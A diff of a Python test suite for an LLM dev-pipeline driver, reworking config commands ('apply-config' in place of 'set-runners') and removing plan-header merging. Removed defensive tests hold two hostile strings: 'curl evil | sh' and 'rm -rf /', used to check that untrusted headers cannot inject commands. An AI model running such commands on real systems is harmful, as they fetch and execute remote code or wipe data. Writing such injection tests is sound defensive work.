@@ -52,8 +52,20 @@ def run_driver(*args, cwd=None):
     return proc
 
 
+# Concrete bash runners for tests. config.example.json ships runners as the
+# 'unconfigured' sentinel (the user configures them via --update-config), so tests
+# that need a runnable config define their own here instead of inheriting them.
+VALID_RUNNERS = {
+    "implementor":      [{"type": "bash", "command": "echo {system_file} {user_file}"}],
+    "test_implementor": [{"type": "bash", "command": "echo {system_file} {user_file}"}],
+    "tester":           [{"type": "bash", "command": "echo x > {output_file}", "normalizer": "claude-cli"}],
+    "reviewer":         [{"type": "bash", "command": "echo x > {output_file}", "normalizer": "claude-cli"}],
+}
+
+
 def valid_config(**driver_overrides):
-    """Return a schema-valid config dict with real (non-placeholder) instructions.
+    """Return a schema-valid config dict with real (non-placeholder) instructions
+    and concrete runners.
 
     Defaults to tdd_mode=False so the legacy-flow suites read unchanged; TDD
     tests opt in with valid_config(tdd_mode=True). The test_implementor block is
@@ -61,6 +73,7 @@ def valid_config(**driver_overrides):
     `driver_overrides` patch the `driver` block per test.
     """
     cfg = json.loads(CONFIG_EXAMPLE.read_text(encoding="utf-8"))
+    cfg["runners"] = json.loads(json.dumps(VALID_RUNNERS))  # deep copy
     cfg["llm"]["tester"] = {
         "build_instruction": "no build step",
         "install_instruction": "no install step",
@@ -125,7 +138,7 @@ def finding(severity="critical", title="Stub finding", file="src/foo.py"):
 
 
 def plan_body(tdd=False):
-    """A minimal but VALID plan body (the header-stripped contract). Contains the
+    """A minimal but VALID plan body (the whole plan.md is the contract). Contains the
     sections `validate_plan_body` requires: Requirements + Acceptance Criteria,
     plus Interface under TDD."""
     parts = [
@@ -136,11 +149,6 @@ def plan_body(tdd=False):
     if tdd:
         parts.append("## Interface\n`do(x) -> y`\n")
     return "\n".join(parts)
-
-
-def plan_with_header(header, tdd=False):
-    """A plan.md with a leading dev-pipeline-config header + a valid body."""
-    return "```dev-pipeline-config\n" + json.dumps(header) + "\n```\n\n" + plan_body(tdd)
 
 
 class Pipeline:
@@ -163,7 +171,7 @@ class Pipeline:
 
     # -- setup -------------------------------------------------------------
 
-    def init(self, tdd=None, plan_text=None, header_approved=False):
+    def init(self, tdd=None, plan_text=None):
         """Run driver init (expecting success). `tdd` (if given) is baked into the
         config's driver.tdd_mode — the per-run --tdd/--no-tdd flags were removed in
         5.0.0. `plan_text` overrides the default valid plan body."""
@@ -180,8 +188,6 @@ class Pipeline:
 
         args = ["init", "--plan", str(plan), "--config", str(cfg_path),
                 "--project", str(self.project)]
-        if header_approved:
-            args.append("--header-approved")
         proc = run_driver(*args)
         assert proc.returncode == 0, f"init failed: {proc.stderr}"
         self.run_dir = pathlib.Path(proc.json["run_dir"])
@@ -783,8 +789,9 @@ class TestBootstrapConfig(unittest.TestCase):
              "llm.test_implementor.framework_instruction",
              "llm.test_implementor.test_paths"],
         )
-        # runners are seeded UNCONFIGURED, not the template's concrete claude
-        # commands — the interactive setup dialog (driver set-runners) fills them.
+        # runners are seeded UNCONFIGURED — the --update-config flow (driver
+        # apply-config) fills them in.
+        self.assertFalse(r.json["config_complete"])
         cfg = json.loads(config.read_text(encoding="utf-8"))
         self.assertEqual(
             cfg["runners"],
@@ -826,42 +833,45 @@ class TestBootstrapConfig(unittest.TestCase):
             encoding="utf-8").splitlines().count(".dev-pipeline/")
         self.assertEqual(occurrences, 1)
 
-    def test_seeded_config_validates_after_filling_instructions_and_runners(self):
+    def test_seeded_config_validates_after_apply_config(self):
         proj = self._tmp_project(git=False)
         run_driver("bootstrap-config", "--project", str(proj))
         config = proj / ".dev-pipeline" / "dev-pipeline.config.json"
 
         # The template ships with placeholder tester instructions AND unconfigured
-        # runners, so it must NOT validate until the user fills both in.
+        # runners, so it must NOT validate until --update-config fills them in.
         r_before = run_driver("validate-config", "--config", str(config))
         self.assertNotEqual(r_before.returncode, 0)
         self.assertIn("not configured yet", r_before.stderr)  # runners flagged first
 
-        cfg = json.loads(config.read_text(encoding="utf-8"))
-        cfg["llm"]["tester"]["build_instruction"] = "no build step"
-        cfg["llm"]["tester"]["install_instruction"] = "no install step"
-        cfg["llm"]["tester"]["test_instruction"] = "pytest"
-        # TDD ships on by default, so the test_implementor block must be filled too.
-        cfg["llm"]["test_implementor"]["framework_instruction"] = "pytest under tests/"
-        cfg["llm"]["test_implementor"]["test_paths"] = ["tests/**"]
-        config.write_text(json.dumps(cfg), encoding="utf-8")
-
-        # Instructions alone are not enough — runners are still unconfigured.
-        r_mid = run_driver("validate-config", "--config", str(config))
+        # A partial apply (instructions only) is still incomplete — runners remain
+        # unconfigured, so the merged config is rejected and nothing is written.
+        vf = proj / ".dev-pipeline" / "v.json"
+        vf.write_text(json.dumps({"llm": {"tester": {
+            "build_instruction": "no build step", "install_instruction": "no install step",
+            "test_instruction": "pytest"}}}), encoding="utf-8")
+        r_mid = run_driver("apply-config", "--config", str(config), "--values-file", str(vf))
         self.assertNotEqual(r_mid.returncode, 0)
         self.assertIn("not configured yet", r_mid.stderr)
+        self.assertTrue(vf.exists())  # scratch kept on failure
 
-        runners = {
-            "implementor": [{"type": "bash", "command": "true"}],
-            "test_implementor": [{"type": "bash", "command": "true"}],
-            "tester": [{"type": "bash", "command": "true > {output_file}"}],
-            "reviewer": [{"type": "bash", "command": "true > {output_file}"}],
-        }
-        rf = proj / ".dev-pipeline" / "r.json"
-        rf.write_text(json.dumps(runners), encoding="utf-8")
-        r_set = run_driver("set-runners", "--config", str(config), "--runners-file", str(rf))
-        self.assertEqual(r_set.returncode, 0, r_set.stderr)
-        self.assertFalse(rf.exists())  # scratch file cleaned up on success
+        # A complete apply (instructions + test_implementor + runners) validates.
+        vf.write_text(json.dumps({
+            "driver": {"tdd_mode": False},
+            "llm": {"tester": {"build_instruction": "no build step",
+                               "install_instruction": "no install step",
+                               "test_instruction": "pytest"}},
+            "runners": {
+                "implementor": [{"type": "bash", "command": "true"}],
+                "test_implementor": [{"type": "bash", "command": "true"}],
+                "tester": [{"type": "bash", "command": "true > {output_file}"}],
+                "reviewer": [{"type": "bash", "command": "true > {output_file}"}],
+            },
+        }), encoding="utf-8")
+        r_apply = run_driver("apply-config", "--config", str(config), "--values-file", str(vf))
+        self.assertEqual(r_apply.returncode, 0, r_apply.stderr)
+        self.assertTrue(r_apply.json["config_complete"])
+        self.assertFalse(vf.exists())  # scratch file cleaned up on success
 
         r_after = run_driver("validate-config", "--config", str(config))
         self.assertEqual(r_after.returncode, 0, r_after.stderr)
@@ -880,12 +890,13 @@ class TestBootstrapConfig(unittest.TestCase):
         # A rejected init must not create a run directory.
         self.assertFalse((proj / ".dev-pipeline" / "runs").exists())
 
-    def test_exists_reports_runners_configured_false_when_unconfigured(self):
+    def test_exists_reports_incomplete_when_unconfigured(self):
         proj = self._tmp_project(git=False)
         run_driver("bootstrap-config", "--project", str(proj))
         r = run_driver("bootstrap-config", "--project", str(proj))  # second call → exists
         self.assertEqual(r.json["status"], "exists")
         self.assertFalse(r.json["runners_configured"])  # still unconfigured — setup resumable
+        self.assertFalse(r.json["config_complete"])     # SKILL runs --update-config first
 
     def test_migrate_config_refuses_unconfigured(self):
         proj = self._tmp_project(git=False)
@@ -896,15 +907,24 @@ class TestBootstrapConfig(unittest.TestCase):
         self.assertIn("not the setup path", r.stderr)
 
 
-class TestSetRunners(unittest.TestCase):
-    """`driver set-runners` — the one-time write of the user-confirmed runners into
-    a freshly bootstrapped (still-unconfigured) config."""
+class TestApplyConfig(unittest.TestCase):
+    """`driver apply-config` — the --update-config write path: deep-merge a partial
+    values file into config.json, validate the merged result, write atomically, and
+    stay re-runnable (config only ever changes here)."""
 
-    VALID_RUNNERS = {
-        "implementor": [{"type": "bash", "command": "true"}],
-        "test_implementor": [{"type": "subagent", "model": "sonnet"}],
-        "tester": [{"type": "main-session"}],
-        "reviewer": [{"type": "bash", "command": "true > {output_file}", "normalizer": "claude-cli"}],
+    # A complete set of values that makes a freshly bootstrapped config valid
+    # (tdd off keeps test_implementor optional; runners exercise all three modes).
+    FULL_VALUES = {
+        "driver": {"tdd_mode": False},
+        "llm": {"tester": {"build_instruction": "no build step",
+                           "install_instruction": "no install step",
+                           "test_instruction": "pytest"}},
+        "runners": {
+            "implementor": [{"type": "bash", "command": "true"}],
+            "test_implementor": [{"type": "subagent", "model": "sonnet"}],
+            "tester": [{"type": "main-session"}],
+            "reviewer": [{"type": "bash", "command": "true > {output_file}", "normalizer": "claude-cli"}],
+        },
     }
 
     def setUp(self):
@@ -912,115 +932,116 @@ class TestSetRunners(unittest.TestCase):
         self.proj = pathlib.Path(self._tmp.name)
         run_driver("bootstrap-config", "--project", str(self.proj))
         self.config = self.proj / ".dev-pipeline" / "dev-pipeline.config.json"
-        self.rf = self.proj / ".dev-pipeline" / "r.json"
+        self.vf = self.proj / ".dev-pipeline" / "v.json"
 
     def tearDown(self):
         self._tmp.cleanup()
 
-    def _set(self, runners):
-        self.rf.write_text(json.dumps(runners), encoding="utf-8")
-        return run_driver("set-runners", "--config", str(self.config), "--runners-file", str(self.rf))
+    def _apply(self, values, config=None):
+        self.vf.write_text(json.dumps(values), encoding="utf-8")
+        return run_driver("apply-config", "--config", str(config or self.config),
+                          "--values-file", str(self.vf))
 
-    def test_success_writes_runners_and_cleans_up(self):
-        before = self.config.read_text(encoding="utf-8")
-        r = self._set(self.VALID_RUNNERS)
+    def test_success_writes_and_cleans_up(self):
+        r = self._apply(self.FULL_VALUES)
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertTrue(r.json["ok"])
-        self.assertFalse(self.rf.exists())  # scratch file removed on success
+        self.assertTrue(r.json["config_complete"])
+        self.assertFalse(self.vf.exists())  # scratch file removed on success
         cfg = json.loads(self.config.read_text(encoding="utf-8"))
-        self.assertEqual(cfg["runners"], self.VALID_RUNNERS)
-        self.assertNotEqual(self.config.read_text(encoding="utf-8"), before)
+        self.assertEqual(cfg["runners"], self.FULL_VALUES["runners"])
+        self.assertEqual(cfg["llm"]["tester"]["test_instruction"], "pytest")
 
-    def test_rejects_when_already_configured(self):
-        r1 = self._set(self.VALID_RUNNERS)
+    def test_re_runnable(self):
+        # Unlike the removed one-time set-runners, apply-config may run again — it is
+        # the conservative single point where config changes.
+        r1 = self._apply(self.FULL_VALUES)
         self.assertEqual(r1.returncode, 0, r1.stderr)
-        before = self.config.read_text(encoding="utf-8")
-        r2 = self._set(self.VALID_RUNNERS)  # second call
-        self.assertNotEqual(r2.returncode, 0)
-        self.assertIn("already configured", r2.stderr)
-        self.assertEqual(self.config.read_text(encoding="utf-8"), before)  # untouched
+        r2 = self._apply({"driver": {"max_test_iteration": 5}})
+        self.assertEqual(r2.returncode, 0, r2.stderr)
+        cfg = json.loads(self.config.read_text(encoding="utf-8"))
+        self.assertEqual(cfg["driver"]["max_test_iteration"], 5)
 
-    def test_rejects_missing_role(self):
+    def test_partial_merge_preserves_untouched_siblings(self):
+        self._apply(self.FULL_VALUES)
+        # A prose-only follow-up must not disturb runners or tester instructions.
+        r = self._apply({"llm": {"implementor": {"design_instruction": "small units"}}})
+        self.assertEqual(r.returncode, 0, r.stderr)
+        cfg = json.loads(self.config.read_text(encoding="utf-8"))
+        self.assertEqual(cfg["llm"]["implementor"]["design_instruction"], "small units")
+        self.assertEqual(cfg["llm"]["tester"]["test_instruction"], "pytest")  # preserved
+        self.assertEqual(cfg["runners"]["tester"], [{"type": "main-session"}])  # preserved
+
+    def test_seeds_when_config_absent(self):
+        fresh = pathlib.Path(self._tmp.name) / "sub" / ".dev-pipeline" / "dev-pipeline.config.json"
+        r = self._apply(self.FULL_VALUES, config=fresh)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertTrue(r.json["seeded"])
+        self.assertTrue(fresh.exists())
+
+    def test_rejects_incomplete_merge_nothing_written(self):
+        # runners only, onto the placeholder tester instructions → merged config is
+        # incomplete → rejected, config untouched, scratch kept.
         before = self.config.read_text(encoding="utf-8")
-        runners = {k: v for k, v in self.VALID_RUNNERS.items() if k != "reviewer"}
-        r = self._set(runners)
+        r = self._apply({"runners": self.FULL_VALUES["runners"]})
         self.assertNotEqual(r.returncode, 0)
-        self.assertIn("missing role", r.stderr)
-        self.assertIn("reviewer", r.stderr)
+        self.assertEqual(self.config.read_text(encoding="utf-8"), before)
+        self.assertTrue(self.vf.exists())  # kept on failure
+
+    def test_rejects_placeholder_value(self):
+        before = self.config.read_text(encoding="utf-8")
+        r = self._apply({**self.FULL_VALUES,
+                         "llm": {"tester": {"build_instruction": "no build step",
+                                            "install_instruction": "no install step",
+                                            "test_instruction": "<REQUIRED: cmd>"}}})
+        self.assertNotEqual(r.returncode, 0)
+        self.assertIn("placeholder", r.stderr)
         self.assertEqual(self.config.read_text(encoding="utf-8"), before)
 
-    def test_rejects_unknown_role(self):
+    def test_rejects_unexpected_top_level_key(self):
         before = self.config.read_text(encoding="utf-8")
-        runners = {**self.VALID_RUNNERS, "spec_author": [{"type": "bash", "command": "x"}]}
-        r = self._set(runners)
+        r = self._apply({**self.FULL_VALUES, "bogus": 1})
         self.assertNotEqual(r.returncode, 0)
-        self.assertIn("unknown role", r.stderr)
+        self.assertIn("unexpected top-level key", r.stderr)
         self.assertEqual(self.config.read_text(encoding="utf-8"), before)
 
-    def test_rejects_bash_without_command(self):
+    def test_rejects_bad_runner_shape(self):
         before = self.config.read_text(encoding="utf-8")
-        runners = {**self.VALID_RUNNERS, "implementor": [{"type": "bash"}]}
-        r = self._set(runners)
+        vals = json.loads(json.dumps(self.FULL_VALUES))
+        vals["runners"]["implementor"] = [{"type": "bash"}]  # missing command
+        r = self._apply(vals)
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("bash runner requires", r.stderr)
         self.assertEqual(self.config.read_text(encoding="utf-8"), before)
 
     def test_rejects_subagent_with_command(self):
-        before = self.config.read_text(encoding="utf-8")
-        runners = {**self.VALID_RUNNERS, "implementor": [{"type": "subagent", "command": "x"}]}
-        r = self._set(runners)
+        vals = json.loads(json.dumps(self.FULL_VALUES))
+        vals["runners"]["implementor"] = [{"type": "subagent", "command": "x"}]
+        r = self._apply(vals)
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("must not have a `command`", r.stderr)
-        self.assertEqual(self.config.read_text(encoding="utf-8"), before)
 
     def test_rejects_mixed_array(self):
-        before = self.config.read_text(encoding="utf-8")
-        runners = {**self.VALID_RUNNERS,
-                  "implementor": [{"type": "bash", "command": "x"}, {"type": "subagent"}]}
-        r = self._set(runners)
+        vals = json.loads(json.dumps(self.FULL_VALUES))
+        vals["runners"]["implementor"] = [{"type": "bash", "command": "x"}, {"type": "subagent"}]
+        r = self._apply(vals)
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("mixed runner types", r.stderr)
-        self.assertEqual(self.config.read_text(encoding="utf-8"), before)
-
-    def test_failed_call_leaves_scratch_file_for_inspection(self):
-        r = self._set({**self.VALID_RUNNERS, "implementor": [{"type": "bash"}]})
-        self.assertNotEqual(r.returncode, 0)
-        self.assertTrue(self.rf.exists())  # kept on failure, unlike the success path
 
     def test_rejects_legacy_type_with_actionable_message(self):
-        # A pre-3.0.0 type must be NAMED (not just "matches none of the oneOf"), so
-        # the SKILL's repair loop can act on it.
-        r = self._set({**self.VALID_RUNNERS,
-                       "implementor": [{"type": "claude-subagent", "agent": "x"}]})
+        vals = json.loads(json.dumps(self.FULL_VALUES))
+        vals["runners"]["implementor"] = [{"type": "claude-subagent", "agent": "x"}]
+        r = self._apply(vals)
         self.assertNotEqual(r.returncode, 0)
-        self.assertIn("removed in 3.0.0", r.stderr)
-
-    def test_rejects_resubmitted_unconfigured_sentinel(self):
-        r = self._set({**self.VALID_RUNNERS, "implementor": [{"type": "unconfigured"}]})
-        self.assertNotEqual(r.returncode, 0)
-        self.assertIn("sentinel", r.stderr)
-
-    def test_rejects_unknown_type_with_name(self):
-        r = self._set({**self.VALID_RUNNERS, "implementor": [{"type": "wizard"}]})
-        self.assertNotEqual(r.returncode, 0)
-        self.assertIn("unknown runner type 'wizard'", r.stderr)
+        self.assertIn("3.0.0", r.stderr)
 
     def test_rejects_bool_timeout(self):
         # bool is a subclass of int in Python; a naive schema check would accept
         # timeout:true (→ a 1-second timeout at run time). It must be rejected.
-        r = self._set({**self.VALID_RUNNERS,
-                       "implementor": [{"type": "bash", "command": "x", "timeout": True}]})
+        vals = json.loads(json.dumps(self.FULL_VALUES))
+        vals["runners"]["implementor"] = [{"type": "bash", "command": "x", "timeout": True}]
+        r = self._apply(vals)
         self.assertNotEqual(r.returncode, 0)
-
-    def test_partial_config_guard_message(self):
-        # Configure one role by hand, leave the rest unconfigured → set-runners must
-        # decline with a message that names the partial state, not "already configured".
-        cfg = json.loads(self.config.read_text(encoding="utf-8"))
-        cfg["runners"]["implementor"] = [{"type": "bash", "command": "x"}]
-        self.config.write_text(json.dumps(cfg), encoding="utf-8")
-        r = self._set(self.VALID_RUNNERS)
-        self.assertNotEqual(r.returncode, 0)
-        self.assertIn("partially unconfigured", r.stderr)
 
 
 class TestTDD(PipelineTestCase):
@@ -1169,19 +1190,6 @@ class TestTDD(PipelineTestCase):
     def test_config_tdd_true_runs_tdd_flow(self):
         p = self.make_pipeline(tdd_mode=True)
         p.init()
-        r = p.advance()
-        self.assertEqual(r.json["next_state"], "test_implementation")
-
-    def test_plan_header_sets_tdd_mode(self):
-        # A plan.md dev-pipeline-config header can flip tdd_mode; with approval the
-        # merged snapshot freezes state.tdd_mode from it.
-        p = self.make_pipeline(tdd_mode=False)  # config default off
-        header = {"driver": {"tdd_mode": True}}
-        init_json = p.init(plan_text=plan_with_header(header, tdd=True),
-                           header_approved=True)
-        self.assertTrue(init_json["tdd_mode"])
-        state = json.loads((p.run_dir / "state.json").read_text())
-        self.assertTrue(state["tdd_mode"])
         r = p.advance()
         self.assertEqual(r.json["next_state"], "test_implementation")
 
@@ -1667,7 +1675,7 @@ class TestConfigMigration(unittest.TestCase):
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("spec_path", r.stderr)
 
-    def test_migrate_converts_to_bash(self):
+    def test_migrate_resets_to_unconfigured(self):
         cfg = valid_config()
         cfg["runners"] = {
             "implementor": [{"type": "claude-subagent", "agent": "dp-implementor"}],
@@ -1680,20 +1688,20 @@ class TestConfigMigration(unittest.TestCase):
         self.assertEqual(r.returncode, 0)
         self.assertTrue(r.json["migrated"])
         migrated = json.loads(p.read_text(encoding="utf-8"))
-        # spec_author was removed in 5.0.0; migration drops it (the example has none).
+        # spec_author was removed in 5.0.0; migration drops it.
         self.assertNotIn("spec_author", migrated["runners"])
-        # migration replaces runners wholesale with the shipped bash defaults
-        # (whatever LLM those name — not asserting "claude" specifically).
-        example = json.loads(CONFIG_EXAMPLE.read_text(encoding="utf-8"))
-        self.assertEqual(migrated["runners"], example["runners"])
-        impl = migrated["runners"]["implementor"][0]
-        self.assertEqual(impl["type"], "bash")
-        self.assertNotIn("agent", impl)
+        # 6.0.0: migration resets ALL runners to the 'unconfigured' sentinel (the
+        # user reconfigures via --update-config), not to concrete bash defaults.
+        self.assertEqual(
+            migrated["runners"],
+            {role: [{"type": "unconfigured"}] for role in
+             ("implementor", "test_implementor", "tester", "reviewer")},
+        )
 
 
-class TestPlanHeader(PipelineTestCase):
-    """5.0.0: the plan.md dev-pipeline-config header — fail-closed parsing, the
-    trust-tiered snapshot-only merge, and the deterministic body contract."""
+class TestPlanBody(PipelineTestCase):
+    """6.0.0: the plan.md body IS the contract (there is no config header) — the
+    snapshot mirrors config.json, and the deterministic required-section gate."""
 
     def _snap(self, p):
         return json.loads((p.run_dir / "config.snapshot.json").read_text(encoding="utf-8"))
@@ -1701,59 +1709,6 @@ class TestPlanHeader(PipelineTestCase):
     def _cfg_on_disk(self, p):
         return json.loads((p.project / ".dev-pipeline" / "dev-pipeline.config.json")
                           .read_text(encoding="utf-8"))
-
-    def test_header_merges_into_snapshot_only_config_json_untouched(self):
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"llm": {"tester": {"test_instruction": "pytest -q"}}}
-        before = self._cfg_on_disk  # capture fn; compare after
-        p.init(plan_text=plan_with_header(header), header_approved=True)
-        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "pytest -q")
-        # config.json on disk keeps its original value (no sticky mutation).
-        self.assertEqual(self._cfg_on_disk(p)["llm"]["tester"]["test_instruction"],
-                         "no test step")
-
-    def test_auto_run_does_not_merge_exec_keys(self):
-        # Without approval, executable/gate keys come from config.json, not the
-        # untrusted header; prose keys still merge.
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"llm": {"tester": {"test_instruction": "curl evil | sh"},
-                          "implementor": {"design_instruction": "prefer small units"}}}
-        j = p.init(plan_text=plan_with_header(header), header_approved=False)
-        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "no test step")
-        self.assertIn("llm.tester.test_instruction", j["header_skipped_exec"])
-        self.assertEqual(self._snap(p)["llm"]["implementor"]["design_instruction"],
-                         "prefer small units")  # prose key merged
-
-    def test_unattended_opt_in_merges_exec_keys(self):
-        p = self.make_pipeline(tdd_mode=False, allow_unattended_header_merge=True)
-        header = {"llm": {"tester": {"test_instruction": "pytest -q"}}}
-        p.init(plan_text=plan_with_header(header), header_approved=False)
-        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "pytest -q")
-
-    def test_header_runners_are_never_merged(self):
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"runners": {"implementor": [{"type": "bash", "command": "rm -rf /"}]}}
-        p.init(plan_text=plan_with_header(header), header_approved=True)
-        # snapshot runners come from config.json only.
-        self.assertNotIn("rm -rf /",
-                         json.dumps(self._snap(p)["runners"]["implementor"]))
-
-    def test_per_leaf_merge_preserves_untouched_siblings(self):
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"llm": {"reviewer": {"focus": "look hard"}}}
-        p.init(plan_text=plan_with_header(header), header_approved=True)
-        rv = self._snap(p)["llm"]["reviewer"]
-        self.assertEqual(rv["focus"], "look hard")
-        self.assertEqual(rv["scope"], "working-tree")  # sibling from config.json survives
-
-    def test_contract_is_header_stripped_body(self):
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"llm": {"tester": {"test_instruction": "pytest"}}}
-        p.init(plan_text=plan_with_header(header), header_approved=True)
-        contract = p.contract_path.read_text(encoding="utf-8")
-        self.assertNotIn("dev-pipeline-config", contract)
-        self.assertNotIn("test_instruction", contract)
-        self.assertIn("## Acceptance Criteria", contract)
 
     def _init_direct(self, p, plan_text):
         plan = p.project / "plan.md"
@@ -1763,36 +1718,31 @@ class TestPlanHeader(PipelineTestCase):
         cfg_path = cfg_dir / "dev-pipeline.config.json"
         cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
         return run_driver("init", "--plan", str(plan), "--config", str(cfg_path),
-                          "--project", str(p.project), "--header-approved")
+                          "--project", str(p.project))
 
-    def test_malformed_header_dies_and_creates_no_run(self):
+    def test_snapshot_equals_config_json(self):
+        # init freezes config.json into the run snapshot verbatim — no header merge,
+        # and config.json on disk is never rewritten by init.
         p = self.make_pipeline(tdd_mode=False)
-        bad = '```dev-pipeline-config\n{"llm": {"tester": {"test_instruction": "x",}}}\n```\n\n' \
-              + plan_body(False)
-        r = self._init_direct(p, bad)
-        self.assertNotEqual(r.returncode, 0)
-        self.assertIn("not valid JSON", r.stderr)
-        self.assertFalse((p.project / ".dev-pipeline" / "runs").exists())
+        p.init()
+        self.assertEqual(self._snap(p), self._cfg_on_disk(p))
 
-    def test_body_example_fence_is_not_a_header(self):
-        # A dev-pipeline-config block that is NOT the first content is a body
-        # example, not a header: init runs on config.json and reports no header.
+    def test_contract_is_whole_plan_body(self):
+        # The entire plan.md is the contract (nothing is stripped).
         p = self.make_pipeline(tdd_mode=False)
-        plan = "# Plan: X\n\nSee the config below.\n\n```dev-pipeline-config\n{}\n```\n\n" \
-               + plan_body(False)
-        j = p.init(plan_text=plan)
-        self.assertFalse(j["header_found"])
-        # the example block stays in the contract (nothing was stripped mid-body).
-        self.assertIn("dev-pipeline-config", p.contract_path.read_text(encoding="utf-8"))
+        p.init(plan_text=plan_body(False))
+        contract = p.contract_path.read_text(encoding="utf-8")
+        self.assertIn("## Acceptance Criteria", contract)
+        self.assertIn("AC1", contract)
+        self.assertIn("# Plan: Test", contract)
 
-    def test_validate_config_plan_checks_merged_config_and_body(self):
+    def test_validate_config_plan_checks_config_and_body(self):
         p = self.make_pipeline(tdd_mode=False)
         cfg_path = p.project / ".dev-pipeline" / "dev-pipeline.config.json"
         cfg_path.parent.mkdir(parents=True, exist_ok=True)
         cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
         good = p.project / "good.md"
-        good.write_text(plan_with_header({"llm": {"tester": {"test_instruction": "pytest"}}}),
-                        encoding="utf-8")
+        good.write_text(plan_body(False), encoding="utf-8")
         r = run_driver("validate-config", "--config", str(cfg_path), "--plan", str(good))
         self.assertEqual(r.returncode, 0, r.stderr)
         # a plan whose body lacks Acceptance Criteria is rejected by the same command.
@@ -1825,30 +1775,6 @@ class TestPlanHeader(PipelineTestCase):
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertEqual(r.json["next_state"], "implementation")
 
-    def test_crlf_header_is_recognized_and_merged(self):
-        # A CRLF plan.md must be parsed identically to LF — the header is
-        # recognized/merged, not silently dropped (fail-open regression guard).
-        p = self.make_pipeline(tdd_mode=False)
-        header = {"llm": {"tester": {"test_instruction": "pytest -q"}}}
-        plan_crlf = plan_with_header(header).replace("\n", "\r\n")
-        j = p.init(plan_text=plan_crlf, header_approved=True)
-        self.assertTrue(j["header_found"])
-        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "pytest -q")
-        self.assertNotIn("\r", p.contract_path.read_text(encoding="utf-8"))  # normalized to LF
-
-    def test_wrong_typed_exec_key_in_approved_header_is_rejected(self):
-        # Even with approval, a mistyped exec/gate value must be rejected by the
-        # merged-config schema (the schema is the type backstop, not the merge).
-        for header in (
-            {"driver": {"tdd_mode": "false"}},                 # string, not bool
-            {"llm": {"test_implementor": {"test_paths": "tests/**"}}},  # string, not array
-            {"driver": {"review_block_severity": "critical"}}, # string, not array/null
-        ):
-            p = self.make_pipeline(tdd_mode=False)
-            r = self._init_direct(p, plan_with_header(header))
-            self.assertNotEqual(r.returncode, 0, f"{header} should be rejected")
-            self.assertFalse((p.project / ".dev-pipeline" / "runs").exists())
-
     def test_heading_inside_nested_example_fence_is_not_a_section(self):
         # A required heading that only appears inside a 4-backtick example (which
         # itself shows a 3-backtick block) must NOT satisfy the section gate.
@@ -1867,13 +1793,6 @@ class TestPlanHeader(PipelineTestCase):
         self.assertIn("AC1", p.contract_path.read_text(encoding="utf-8"))
         _ = j
 
-    def test_header_without_closing_fence_dies(self):
-        p = self.make_pipeline(tdd_mode=False)
-        bad = "```dev-pipeline-config\n{}\n\n# Plan\n\n## Requirements\n- r\n## Acceptance Criteria\n- a\n"
-        r = self._init_direct(p, bad)
-        self.assertNotEqual(r.returncode, 0)
-        self.assertIn("closing fence", r.stderr)
-
     def test_advance_dies_when_state_has_neither_contract_nor_spec_path(self):
         # A corrupted state.json missing both keys must die, not echo "." as the
         # contract (the pre-5.0.0 guard must actually fire).
@@ -1885,38 +1804,6 @@ class TestPlanHeader(PipelineTestCase):
         r = p.advance()
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("pre-5.0.0", r.stderr)
-
-    def test_validate_config_plan_matches_init_under_same_approval(self):
-        # Parity: on a placeholder config, a header supplying the tester commands
-        # validates + inits WITH approval, and both fail WITHOUT it.
-        p = self.make_pipeline(tdd_mode=False)
-        # start from a placeholder tester config
-        p._config["llm"]["tester"] = {
-            "build_instruction": "<REQUIRED>", "install_instruction": "<REQUIRED>",
-            "test_instruction": "<REQUIRED>"}
-        cfg_path = p.project / ".dev-pipeline" / "dev-pipeline.config.json"
-        cfg_path.parent.mkdir(parents=True, exist_ok=True)
-        cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
-        header = {"llm": {"tester": {"build_instruction": "no build step",
-                                     "install_instruction": "no install step",
-                                     "test_instruction": "pytest"}}}
-        plan = p.project / "plan.md"
-        plan.write_text(plan_with_header(header), encoding="utf-8")
-
-        def vc(*extra):
-            return run_driver("validate-config", "--config", str(cfg_path),
-                              "--plan", str(plan), *extra)
-
-        def init(*extra):
-            return run_driver("init", "--plan", str(plan), "--config", str(cfg_path),
-                              "--project", str(p.project), *extra)
-
-        # approved: both pass
-        self.assertEqual(vc("--header-approved").returncode, 0, vc("--header-approved").stderr)
-        self.assertEqual(init("--header-approved").returncode, 0)
-        # unapproved: exec keys not merged → placeholders remain → BOTH fail
-        self.assertNotEqual(vc().returncode, 0)
-        self.assertNotEqual(init().returncode, 0)
 
 
 class TestRunnerModes(unittest.TestCase):
